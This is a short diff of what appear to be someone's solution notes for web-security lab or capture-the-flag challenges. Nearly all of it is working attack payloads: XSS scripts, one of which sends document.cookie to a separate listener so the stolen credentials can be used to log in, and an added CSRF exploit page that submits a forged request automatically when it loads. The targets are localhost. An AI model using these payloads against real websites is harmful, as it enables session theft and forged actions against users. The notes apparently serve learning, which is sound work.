@@ -81,3 +81,19 @@ except Exception as e:
       <script>fetch("/public", {method: "POST"});</script>
     XSS 7
       <script>fetch("http://localhost:8080", {method: "POST", body: document.cookie});</script> -> login with creds
+
+    CSRF 1 
+      set up http server with index.html:
+        <!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <form id="csrfForm" action="http://localhost/publish" method="GET"> </form>
+    <script>
+        // Automatically submit the form on page load
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
